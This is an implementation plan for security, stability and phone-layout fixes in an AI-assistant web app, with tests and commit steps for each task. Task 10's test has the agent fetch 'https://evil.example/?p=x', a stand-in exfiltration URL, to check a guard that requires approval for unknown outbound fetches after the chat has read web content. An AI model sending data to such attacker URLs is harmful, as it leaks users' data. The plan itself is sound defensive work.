# Audit Fixes Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fix the phone layout so every page and input works on iPhones, close the security and stability gaps from the audit, and make the docs match the code.

**Architecture:** Three batches, one commit each:

1. CSS and small React changes built around one shared safe-area value, with tiny pure helpers that carry unit tests.
2. Server-side guards in the existing modules, with no new subsystems.
3. Docs only, plus the `ka check` change and a dead-trigger removal.

**Tech Stack:** FastAPI, SQLite, APScheduler, httpx, React 18, Vite, vitest, pytest.

**Spec:** `Docs/superpowers/specs/2026-11-20-audit-fixes-design.md`

## Global Constraints

- No redesign. Keep the existing look, the Ka entity animations, colours and spacing. Desktop layout must not change apart from scrollbar and scroll behaviour.
- Target sizes: 375x667, 393x852, 430x932 and 852x393. Simulated safe area: 34px bottom, 59px top.
- No new approval prompts on chats that never read outside content.
- Error copy, exactly:
  - "Another chat is still answering. Try again in a moment."
  - "This loop is already running."
  - "You have 10 active loops. Pause one first."
- Limits:
  - 10 active loops per account
  - 1 loop run at a time per account
  - 2 chat turns at once per account
  - OAuth state: 10 minutes, at most 5 per account
- Money stays `Decimal`. No LLM call in the parser or tagging path.
- Each flow change updates its `context/flows/` doc in the same commit (`flow-docs` skill).
- Commits use the owner's noreply author with no Co-Authored-By trailers. Never edit the commit-guard denylist.
- Tests stay few: one per risky behaviour.

## Review Focus

1. The iOS keyboard opens on the composer, then closes. The composer must return to its resting place, with no leftover offset and no gap under it. The test is in Task 4.
2. Docked chat with a long thread while answering. The last line must stay above the composer, and the thinking ring must sit inside the composer box. The test is in Task 1, plus the Task 6 matrix.
3. Someone scrolls up during a streamed answer. The chat must not pull them back down. The test is in Task 2.
4. A conversation searched the web earlier, and the person's next message pastes a URL. That URL must open with no prompt. The test is in Task 10.
5. One account starts a third chat while two are running. The other accounts are unaffected and this one gets the 429 copy. The test is in Task 13.

---

## Batch 1: phone UI

### Task 1: Safe-area value and chat geometry

**Files:**
- Modify: `ui/src/styles.css`. Affects `:root` tokens, `.composer` (136), `.msgs` (92), `.thinking-ring` (154) and `main.screen` scroll padding (302).
- Modify: `ui/src/features/chat/entityStyle.ts:38-67`
- Test: `ui/src/features/chat/entityStyle.test.ts`

**Interfaces:**
- Produces: the CSS custom property `--safe-b: env(safe-area-inset-bottom, 0px)` on `:root`. Every later task uses this name.

- [ ] **Step 1: Write the failing test** in `entityStyle.test.ts`:

```ts
test('every bottom-anchored mode follows the safe area', () => {
  for (const mode of ['typing', 'thinking', 'searching', 'waiting', 'docked'] as const)
    expect(entityStyle(mode, 0, false).t).toContain('var(--safe-b)')
  expect(entityStyle('typing', 0, false).t).toBe('calc(100% - 80px - var(--safe-b))')
})
```

- [ ] **Step 2: Run the test to verify it fails.** Run `cd ui && npx vitest run src/features/chat/entityStyle.test.ts`. Expected: FAIL; `t` is `calc(100% - 80px)`.
- [ ] **Step 3: Implement.**
  - In `entityStyle`, append `- var(--safe-b)` inside every `calc(100% - Npx)` top value: `bar`, the default `e.t`, thinking, searching, waiting.
  - In CSS, add `--safe-b` to `:root`.
  - `.composer` bottom becomes `calc(24px + var(--safe-b))`.
  - `.msgs` bottom inset becomes `calc(96px + var(--safe-b))`.
  - `.thinking-ring` top becomes `calc(100% - 72px - var(--safe-b))`.
  - `main.screen` `scroll-padding-bottom` becomes `calc(96px + var(--safe-b))`.
  - Replace every other `env(safe-area-inset-bottom)` in `styles.css` with `var(--safe-b)`.
- [ ] **Step 4: Run the test to verify it passes.** Same command. Expected: PASS.

### Task 2: Chat follows the stream only near the bottom; smooth scroll; no scrollbar

**Files:**
- Create: `ui/src/features/chat/follow.ts`
- Modify: `ui/src/features/chat/ChatPage.tsx:95-97,168-171`
- Modify: `ui/src/styles.css` (`.msgs`)
- Test: `ui/src/features/chat/follow.test.ts`

**Interfaces:**
- Produces: `nearBottom(el: { scrollTop: number; scrollHeight: number; clientHeight: number }, slack?: number): boolean`. The default `slack` is 80.

- [ ] **Step 1: Write the failing test**:

```ts
test('follows only within 80px of the bottom', () => {
  expect(nearBottom({ scrollTop: 920, scrollHeight: 1500, clientHeight: 500 })).toBe(true)  // 80 left
  expect(nearBottom({ scrollTop: 900, scrollHeight: 1500, clientHeight: 500 })).toBe(false) // 100 left
})
```

- [ ] **Step 2: Run** `npx vitest run src/features/chat/follow.test.ts`. Expected: FAIL; the module is not found.
- [ ] **Step 3: Implement `nearBottom`.** Then in ChatPage:
  - Keep a `following` ref, updated in the `.msgs` `onScroll` with `nearBottom(el)`.
  - Set it to `true` when the person sends a message and when a conversation loads.
  - The items/phase effect and `onAnimationEnd` scroll only while `following.current`. They use `{ top: scrollHeight, behavior: 'smooth' }`.
  - A conversation load jumps there instantly (no smooth).
- [ ] **Step 4: Update the CSS.** `.msgs` gets:
  - `scrollbar-width: none`, plus `.msgs::-webkit-scrollbar { display: none }`
  - `overscroll-behavior: contain`
  - `-webkit-overflow-scrolling: touch`
- [ ] **Step 5: Run the test.** Expected: PASS.

### Task 3: App shell, short screens, form controls, page bottoms

**Files:**
- Modify: `ui/src/styles.css`. Affects `html, body, #root` (22), `.app` (35), `.page` (163), `.empty` media rule (135), `.field input, .field select, .field textarea` (233-234), `.ka-ring-layer` (261) and `main.screen`.

There is no unit test, because this is CSS only. The Task 6 matrix verifies it.

- [ ] **Step 1: Shell.**
  - `html, body` get `overscroll-behavior: none`.
  - `.app` drops `min-height: 560px` and uses `height: 100dvh`, with `height: 100%` above it as the fallback.
  - `main.screen` gets `overscroll-behavior: contain`.
  - Under `@media (hover: none)`, add `main.screen { scrollbar-width: none }` and its `::-webkit-scrollbar` twin.
- [ ] **Step 2: Short screens.** Add `@media (max-height: 500px)`:
  - The `.empty` block moves up so it ends at least 16px above the composer's top.
  - `.empty .sub` and the empty-state secondary lines are hidden.
  - The empty Entity shrinks. Add a `short` flag only if the CSS cannot reach it; prefer a CSS transform on `.entity-stage`.
- [ ] **Step 3: Form controls.**
  - `.field input, .field select, .field textarea` get `-webkit-appearance: none; appearance: none`.
  - `.field select` gets `padding-right: 40px` and a background chevron: an inline SVG data URL, stroke `currentColor`-like grey `#8A8F98`, 12px, `right 14px center`.
  - Checkboxes are untouched.
- [ ] **Step 4: Page bottoms and canvas.**
  - `.page` bottom padding becomes `calc(32px + var(--safe-b))`.
  - `.ka-ring-layer` drops `width: 100vw; height: 100vh` and keeps `inset: 0`.
- [ ] **Step 5: Run** `cd ui && npx vitest run && npm run lint`. Expected: all pass.

### Task 4: iOS keyboard keeps the composer visible and leaves no offset

**Files:**
- Create: `ui/src/lib/viewport.ts`
- Modify: `ui/src/main.tsx` (call it once)
- Modify: `ui/src/styles.css` (`.composer` bottom)
- Test: `ui/src/lib/viewport.test.ts`

**Interfaces:**
- Produces: `watchKeyboard(win: Window): () => void`.
  - It sets `--kb` on `document.documentElement` to `max(0, innerHeight - visualViewport.height - visualViewport.offsetTop)` px, on `visualViewport` `resize` and `scroll`.
  - When the value returns to 0, it calls `win.scrollTo(0, 0)` so iOS's leftover page shift is cleared.
  - It returns an unsubscribe function.
  - It does nothing when `visualViewport` is missing.

- [ ] **Step 1: Write the failing test.** Use a fake window: `innerHeight: 852`, a `visualViewport` EventTarget with `height` and `offsetTop`, and a `scrollTo` spy.

```ts
test('keyboard height in, offset cleared out', () => {
  const { win, vv, scrollTo } = fakeWindow(852)
  watchKeyboard(win)
  vv.height = 516; vv.dispatchEvent(new Event('resize'))
  expect(document.documentElement.style.getPropertyValue('--kb')).toBe('336px')
  vv.height = 852; vv.dispatchEvent(new Event('resize'))
  expect(document.documentElement.style.getPropertyValue('--kb')).toBe('0px')
  expect(scrollTo).toHaveBeenCalledWith(0, 0)
})
```

- [ ] **Step 2: Run** `npx vitest run src/lib/viewport.test.ts`. Expected: FAIL; the module is not found.
- [ ] **Step 3: Implement.**
  - `.composer` bottom becomes `calc(24px + max(var(--safe-b), var(--kb, 0px)))`. The keyboard covers the home bar, so take the larger value, not the sum.
  - `.msgs` and the Task 1 entity tops use the same `max(...)` expression. Extend the Task 1 test's expected string to match.
  - Call `watchKeyboard(window)` in `main.tsx`.
- [ ] **Step 4: Run** the viewport and entityStyle tests. Expected: PASS.

### Task 5: Onboarding scroll, step 5 layout, provider name

**Files:**
- Modify: `ui/src/styles.css` (`.obstep` wrapper, 223-226)
- Modify: `ui/src/features/onboarding/OnboardingPage.tsx:46-75`
- Modify: `ui/src/features/onboarding/StepMemory.tsx:24`
- Modify: `ui/src/features/onboarding/StepSend.tsx:177,223`
- Create: `ui/src/features/onboarding/provider.ts`
- Test: `ui/src/features/onboarding/provider.test.ts`

**Interfaces:**
- Produces: `providerName(id: string | undefined): string`. It maps `openai` to "OpenAI", `anthropic` to "Anthropic", `openrouter` to "OpenRouter" and `ollama` to "Ollama (on this machine)". Anything else is returned as given. `undefined` returns "your model provider".

- [ ] **Step 1: Write the failing test**:

```ts
test('provider ids read as names', () => {
  expect(providerName('openai')).toBe('OpenAI')
  expect(providerName(undefined)).toBe('your model provider')
  expect(providerName('acme')).toBe('acme')
})
```

- [ ] **Step 2: Run** `npx vitest run src/features/onboarding/provider.test.ts`. Expected: FAIL.
- [ ] **Step 3: Implement.**
  - Add `providerName` and use it at `StepSend.tsx:177`.
  - Give the steps' shared grid wrapper `overflow: hidden` (`.obsteps`, the element at `OnboardingPage.tsx:46`, adding the class if missing). Hidden absolute steps then add no scroll height.
  - On `step` change, scroll the nearest `main.screen` to the top, using a `useEffect` on `step` with `closest('main.screen')?.scrollTo({ top: 0 })`.
  - In `StepMemory.tsx:24`, replace `className="col"` with a plain flex column: `style={{ display: 'flex', flexDirection: 'column', gap: 8 }}`.
- [ ] **Step 4: Run** `npx vitest run`. Expected: all pass.

### Task 6: Batch 1 verification, docs, commit

- [ ] **Step 1:** Run `cd ui && npx tsc -b && npm run lint && npx vitest run && npm run build`. Expected: all pass.
- [ ] **Step 2: Browser matrix.**
  - Use a throwaway server: `KA_CONFIG=<scratch config with data_repo=<scratch git repo>> uv run ka serve --port 8011`. Never use the real data repo.
  - Sizes: 375x667, 393x852, 430x932 and 852x393.
  - Simulate the safe area by rewriting `env(safe-area-inset-*)` in the loaded stylesheets to 34px and 59px.
  - Check welcome, sign-up, login, onboarding steps 2-6, chat (empty, typing, docked long thread), pending, loops, activity, settings and the sidebar.
  - Pass means:
    - no horizontal overflow (`scrollWidth == innerWidth`)
    - entity and composer edges within 1px in typing mode
    - the last message above the composer
    - no empty scroll space on onboarding steps
- [ ] **Step 3: iOS Simulator.** Use iPhone 17 Pro and iPhone SE in Safari, against the throwaway server. Check:
  - keyboard open and close on the composer and on onboarding fields, with no leftover offset
  - select and input styling
  - the real safe area in chat typing and thinking
- [ ] **Step 4: Docs.** Update `context/flows/chat.md` (safe area, follow-near-bottom), `context/flows/pwa.md` (keyboard, viewport, scrollbars) and `context/flows/intake.md` (onboarding scroll) per the `flow-docs` skill.
- [ ] **Step 5: Commit.**

```bash
git add ui/src Docs/superpowers context/flows
git commit -m "fix(ui): phone layout - safe area, keyboard, scrolling, onboarding"
```

---

## Batch 2: security and stability

### Task 7: Login limits and sessions

**Files:**
- Modify: `server/api/auth.py:28-33,103-127`
- Modify: `server/auth/sessions.py` (add `purge_expired`)
- Modify: `server/api/app.py` (hourly job)
- Test: `tests/auth/test_login_limits.py`

**Interfaces:**
- Produces: `purge_expired(db: Db, now: datetime) -> int` in `server/auth/sessions.py`. It deletes rows that are idle or past their hard expiry, and returns the count.

- [ ] **Step 1: Write the failing tests.**
  - `test_wrong_passwords_from_many_addresses_never_lock_the_owner`: sends 60 wrong passwords for `avery` from 12 forwarded addresses (5 each), then the right password from a new address. Assert 200.
  - `test_login_revokes_the_previous_cookie`: sign in, keep cookie A, sign in again on the same client. Assert cookie A gets 401 on `/api/settings`.
  - `test_purge_expired_drops_dead_sessions`: one fresh session and one idle 15 days. `purge_expired` returns 1, and the fresh one still resolves.
- [ ] **Step 2: Run** `uv run pytest tests/auth/test_login_limits.py -v`. Expected: FAIL; 429 for the first, 200 for the second, `ImportError` for the third.
- [ ] **Step 3: Implement.**
  - Delete `per_user` from `LIMITS` and from `login`.
  - At login, `revoke` the incoming `ka_session` cookie token if one is present.
  - Add `purge_expired`.
  - Schedule it hourly as `ScheduledJob("session_purge", {"trigger": "interval", "hours": 1}, ...)` using `Db.system`.
- [ ] **Step 4: Run.** Expected: PASS.

### Task 8: HTTP hardening

**Files:**
- Modify: `server/api/app.py:70-92` (origin check, Content-Length, headers middleware)
- Modify: `server/cli.py` (`uvicorn.run` args, near line 262)
- Test: `tests/api/test_http_hardening.py`

**Interfaces:**
- Produces: `allowed_origins(cfg: Config, port: int) -> set[str]` in `server/api/app.py`. It returns full origins: `http://127.0.0.1:<port>`, `http://localhost:<port>`, and `https://<host>` for each `cfg.ui_hosts` entry.

- [ ] **Step 1: Write the failing tests.**
  - `test_write_from_other_localhost_port_is_refused`: POST `/api/auth/logout` with `Origin: http://localhost:5555`. Assert 403.
  - `test_bad_content_length_is_400`: POST to an upload path with `content-length: abc`. Assert 400.
  - `test_security_headers_on_every_response`: GET `/api/auth/status`. Assert:
    - `x-content-type-options == "nosniff"`
    - `referrer-policy == "same-origin"`
    - `"frame-ancestors 'none'"` in `content-security-policy`
- [ ] **Step 2: Run.** Expected: FAIL.
- [ ] **Step 3: Implement.**
  - Compare `scheme://host[:port]` against `allowed_origins`. Include the Vite dev origin `http://localhost:5173` only when `KA_DEV=1`.
  - Catch `ValueError` on `int(length)` and return 400.
  - Add a headers middleware with CSP `default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'`.
  - In `ka serve`, pass `proxy_headers=True, forwarded_allow_ips="127.0.0.1"` to `uvicorn.run`. Make `server/auth/clientip.py` trust `request.client.host` as uvicorn already resolved it. Keep `client_ip` as the one entry point.
- [ ] **Step 4: Run** the new tests plus `tests/auth`. Expected: PASS.

### Task 9: Bounded in-memory state

**Files:**
- Modify: `server/auth/ratelimit.py`
- Modify: `server/integrations/google/oauth.py:58,116`
- Test: `tests/auth/test_bounded_state.py`

**Interfaces:**
- Produces: `LoginLimiter(max_attempts, window, max_keys: int = 10_000)`. When `max_keys` is reached, it sweeps expired keys and then drops the oldest.
- Produces: `GoogleAuth` state entries `(verifier, created_at)`. `STATE_TTL = timedelta(minutes=10)`, `MAX_STATES = 5`.

- [ ] **Step 1: Write the failing tests.**
  - `test_limiter_never_holds_more_than_max_keys`: `max_keys=3`; five distinct keys. Assert `len(lim._seen) <= 3`.
  - `test_oauth_state_expires_and_is_capped`:
    - Seven `login_url()` calls leave 5 states.
    - A state older than 10 minutes is refused by `finish`, with the "expired" error the callback already shows for an unknown state.
- [ ] **Step 2: Run.** Expected: FAIL.
- [ ] **Step 3: Implement.** Keep insertion order with a `dict`. Drop the oldest first.
- [ ] **Step 4: Run.** Expected: PASS.

### Task 10: Outbound data after outside content; `remember`; malformed calls

**Files:**
- Modify: `server/toolkits/core/web.py:79-89`
- Modify: `server/agent/loop.py:43-45,95-107`
- Test: `tests/agent/test_outbound_guard.py`

**Interfaces:**
- Produces: `conversation_read_untrusted(db: Db, conv_id: str) -> bool` in `server/agent/context.py`. It is true when any earlier assistant `tool_calls` entry in the conversation names a REGISTRY tool with `untrusted=True`.
- Produces: `known_urls(db: Db, conv_id: str) -> set[str]` in `server/agent/context.py`. It returns URLs found in tool results of `web_search` and in the person's own messages, normalised (no fragment, no trailing `/`).
- `fetch_page` returns a `PendingWrite` with summary `"Open <url>?"` and diff `url`, whose `apply` runs the fetch, when `conversation_read_untrusted` is true and the URL is not in `known_urls`. Otherwise it fetches as now.

- [ ] **Step 1: Write the failing tests.** Use a fake adapter scripted to call tools.
  - `test_unknown_url_after_web_read_needs_approval`: turn 1 calls `web_search`; turn 2 calls `fetch_page("https://evil.example/?p=x")`. An `approve` spy is called once; returning False yields `"user declined; nothing was changed"`.
  - `test_url_from_results_or_owner_opens_without_prompt`: same, but the URL came from the search result, and in a second case it appears in the person's message. `approve` is never called.
  - `test_fresh_chat_fetch_has_no_prompt`: no prior untrusted read. `fetch_page` runs with no approval.
  - `test_remember_needs_a_clear_request`:
    - "I don't remember that charge" refuses `remember` with the existing propose_memory message.
    - "Remember that I moved to Leeds" runs it.
  - `test_malformed_queued_call_returns_error`: `_queue` with arguments `"[1]"` returns `"invalid JSON arguments: expected an object"`.
- [ ] **Step 2: Run** `uv run pytest tests/agent/test_outbound_guard.py -v`. Expected: FAIL.
- [ ] **Step 3: Implement.**
  - The `remember` gate uses `re.match(r"\s*(please\s+)?remember(\s+that\b|\s*:)", owner_text, re.I)`.
  - `_queue` copies `_execute`'s object check, and catches `Exception` from `run_tool` as `f"error: {e}"`.
  - The per-turn `tainted` rule in `_turn` is unchanged (spec ruling).
- [ ] **Step 4: Run** the new tests plus `tests/agent`. Expected: PASS.

### Task 11: No message content to Langfuse for private chats

**Files:**
- Modify: `server/tracing.py:95-140`
- Modify: `server/agent/loop.py` (`tool_span` call)
- Test: `tests/test_tracing.py`

**Interfaces:**
- `TracedAdapter` with `task == "private"` never sets `langfuse.observation.input` or `output`.
- `tool_span(name: str, args: dict, private: Callable[[], bool] = lambda: False)` sets input and output only at span exit, and only if `private()` is false. `_execute` passes `lambda: ctx.db is not None and ctx.db.is_private(ctx.conversation_id)`.

- [ ] **Step 1: Write the failing test** `test_private_spans_carry_no_content`. Use the in-memory span exporter the existing tracing tests use.
  - A private adapter call and a tool span whose `private()` turns true during the span both export with no `langfuse.observation.input` or `output`.
  - Their token counts are still present.
- [ ] **Step 2: Run** `uv run pytest tests/test_tracing.py -v`. Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run.** Expected: PASS.

### Task 12: Page fetch limits and DNS pinning

**Files:**
- Modify: `server/web/plain.py`
- Modify: `server/web/providers.py:64-81,105-117`
- Test: `tests/web/test_plain_limits.py`

**Interfaces:**
- Produces: `check_public_url(url: str) -> str`, which now returns the first checked IP.
- `PlainFetcher.fetch` streams with `http.stream("GET", ...)`. It stops reading at `MAX_BYTES` and enforces `FETCH_DEADLINE = 20` seconds overall, using a monotonic check between chunks. After connecting, it refuses if the peer address is not global: read the `network_stream` extension's `server_addr` and run it through the same `is_global` check.
- Provider httpx clients are created once per provider instance and closed by `with` in `fetch_page` and `web_search`.

- [ ] **Step 1: Write the failing tests.** Use `httpx.MockTransport`.
  - `test_large_body_stops_at_cap`: an endless chunk generator gives text of at most `MAX_BYTES` bytes and returns.
  - `test_slow_stream_hits_deadline`: a generator that sleeps per chunk raises `ToolError("page took too long")` within `FETCH_DEADLINE + 1`s. Monkeypatch the deadline to 0.2s.
  - `test_private_peer_is_refused`: the peer address `127.0.0.1` is refused.
- [ ] **Step 2: Run.** Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** the new tests plus `tests/web`. Expected: PASS.

### Task 13: Fair sharing between accounts

**Files:**
- Modify: `server/api/loops.py:71-92,124-134`
- Modify: `server/loops/service.py:17`
- Modify: `server/scheduler.py:30`
- Modify: `server/loops/triggers.py:85`
- Modify: `server/api/chat.py:51-62,125`
- Modify: `ui/src/lib/api.ts:241`
- Modify: `ui/src/features/loops/useLoops.ts` (and `RunList.tsx` if the running row lives there)
- Test: `tests/loops/test_fair_share.py`, `tests/api/test_chat_limits.py`, `ui/src/features/loops/loops.test.ts`

**Interfaces:**
- Produces: `class LoopBusy(Exception)` and `execute(...)` in `server/loops/service.py`. `execute` takes a per-account non-blocking `threading.Lock` from `_running: dict[str, threading.Lock]`, raises `LoopBusy` if it is held, and releases it in `finally`. A scheduled run that hits `LoopBusy` logs at info and returns.
- `start_scheduler` builds `BackgroundScheduler(executors={"default": ThreadPoolExecutor(10), "loops": ThreadPoolExecutor(4)})`. Loop jobs in `triggers.py` pass `executor="loops"`.
- `POST /loops`: count `status == "active"` tasks of kind `agent`. At 10, return 409 with the Global Constraints copy.
- `POST /loops/{id}/run`: if the account's lock is held, return 409 "This loop is already running." Otherwise start `execute` on a daemon thread and return 202 `{"started": true}`. Ruling: no run id is returned, because the run row is created inside `execute`. The UI finds the run in `/runs`.
- `api.runLoop(id): Promise<{ started: true }>`. After it resolves, the Loops UI shows a "Running" row and refetches `loopRuns(id)` every 2s until a run newer than the click time has an end time, or for at most 5 minutes.
- Chat: `app.state.turns_by_user: dict[str, int]` lives under the existing `state.lock`. At 2 it returns 429 with the Global Constraints copy, and it decrements where `state.running.discard` runs. The composer already shows HTTP error text.

- [ ] **Step 1: Write the failing tests.**
  - `test_eleventh_active_loop_is_refused`: assert 409 and the exact copy.
  - `test_run_now_returns_202_and_refuses_while_running`: monkeypatch `execute` to block on an Event. The first call gives 202 and the second gives 409.
  - `test_third_chat_turn_is_refused_per_account`: two slow fake turns for account A, then a third gives 429 with the copy. Account B's turn succeeds.
  - vitest `pollUntilRunEnds`: if a helper is extracted, test that it stops when a run newer than the click has `ended_at`.
- [ ] **Step 2: Run.** Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** the new tests plus `tests/loops`, `tests/api` and `npx vitest run`. Expected: PASS.

### Task 14: Headless loop tools and cost cap

**Files:**
- Modify: `server/agent/loop.py` (`run_turn`, `_turn`)
- Modify: `server/loops/agent_task.py:43-50`
- Modify: `server/toolkits/core/web.py:36-60`
- Modify: `server/agent/tools/registry.py:29`
- Modify: `server/loops/runner.py:41-43`
- Modify: `server/config.py`
- Modify: `config.example.yaml`
- Test: `tests/loops/test_headless_limits.py`

**Interfaces:**
- `run_turn(..., hidden: frozenset[str] = frozenset())`. `_turn` removes `hidden` names from `visible`. `agent_task` passes `frozenset({"schedule_task", "remember"})`.
- `ToolContext.adapter: Adapter | None = None`. When set, `_summariser` uses it instead of building its own. `agent_task` sets it to the run's `BudgetAdapter`.
- `Config.prices: dict[str, Price] = {}`, where `Price(input_per_m: Decimal, output_per_m: Decimal)`.
- `estimate_cost(cfg: Config, model: str, usage) -> Decimal | None` in `server/loops/runner.py`:
  - Use the model's price, or the highest listed price for an unknown model.
  - Return `None` when `prices` is empty.
  - The runner uses it when `reply.cost_usd` is None.

- [ ] **Step 1: Write the failing tests.**
  - `test_loop_run_cannot_see_schedule_or_remember`: the tool specs passed to the fake adapter in a loop run lack both names.
  - `test_summariser_calls_count_against_the_run`: `fetch_page` inside a run with a budget of 1 model call raises the budget stop after the summariser call.
  - `test_unknown_model_costs_at_highest_price`: prices `{a: 1/2, b: 5/10}` (per million); unknown model with 1M input and 1M output gives `Decimal("15")`.
- [ ] **Step 2: Run.** Expected: FAIL.
- [ ] **Step 3: Implement.** Add a commented `prices:` example to `config.example.yaml`.
- [ ] **Step 4: Run** the new tests plus `tests/loops`. Expected: PASS.

### Task 15: Small logic fixes

**Files:**
- Modify: `server/loops/watchdog.py:23-25`
- Modify: `server/toolkits/finance/tools.py:110`
- Modify: `server/memory/pending.py:121-138` (and where loop cards are queued, `server/loops/agent_task.py`)
- Test: `tests/loops/test_watchdog.py`, `tests/finance/test_sum_tool.py`, `tests/memory/test_pending_tool_write.py` (extend existing files where they exist)

**Interfaces:**
- Watchdog key: `f"stale:{task_id}:{last_checkin_iso or 'never'}"`.
- `finance_sum_transactions` count is the number of unique found ids.
- Loop cards store `diff_sha = sha256(diff)`. `approve_tool_write` re-runs the tool. If the new diff's sha differs, it updates the card with the new diff and returns `"the change is different now; review it again"` without applying.

- [ ] **Step 1: Write the failing tests.**
  - `test_dismissed_stale_alert_fires_again_after_new_checkin`
  - `test_sum_counts_unique_ids`: `[a, a, b]` gives count 2.
  - `test_changed_diff_is_not_applied`
- [ ] **Step 2: Run.** Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run.** Expected: PASS.

### Task 16: Batch 2 verification, docs, commit

- [ ] **Step 1:** Run `uv run pytest -q && uv run ruff check . && cd ui && npx tsc -b && npm run lint && npx vitest run && npm run build`. Expected: all pass.
- [ ] **Step 2: Docs** (`flow-docs` skill):
  - `context/flows/login.md`: limits table, logout, session purge
  - `web.md`: allowlist, fetch limits
  - `tracing.md`: private spans
  - `loops.md`: caps, 202, executor, headless tools, cost estimate
  - `chat.md`: per-account turn cap
  - `config.md`: `prices`
  - `context/decisions.md`: the lockout line
- [ ] **Step 3: Commit.**

```bash
git add server ui/src tests config.example.yaml context
git commit -m "fix: audit batch 2 - login limits, outbound guard, private tracing, fair sharing"
```

---

## Batch 3: docs

### Task 17: Make the docs match the code

**Files:**
- Modify the files named in spec Batch 3, items 1-15.
- Modify: `server/cli.py:39-50` (`_check` validates every account)
- Modify: `server/scheduler.py:106` (remove the unused cron trigger)
- Test: `tests/test_cli.py`

**Interfaces:**
- `_check` with several accounts and no `--user` runs the existing per-account validation for each account. It prints `ok: <username>` or the error per account and returns 1 if any account fails.

- [ ] **Step 1: Write the failing test.** `test_check_validates_every_account`: two accounts, one with a broken `accounts.yaml`. `_check` returns 1, and the output names both usernames.
- [ ] **Step 2: Run** `uv run pytest tests/test_cli.py -v`. Expected: FAIL; it returns 0.
- [ ] **Step 3: Implement** `_check`, remove the dead trigger, and apply doc items 1-15 exactly as the spec lists them. Item 1 follows Batch 2's lockout removal.
- [ ] **Step 4:** Run `uv run pytest -q && uv run ruff check .`, then `grep -rn "memory_tools.py\|memory.yaml\|No auth" context AGENTS.md Docs/post-build-setup.md`. Expected: tests pass; the grep returns nothing.
- [ ] **Step 5: Commit.**

```bash
git add context AGENTS.md Docs config.example.yaml server/cli.py server/scheduler.py tests/test_cli.py
git commit -m "docs: match docs to code after the multi-account change"
```
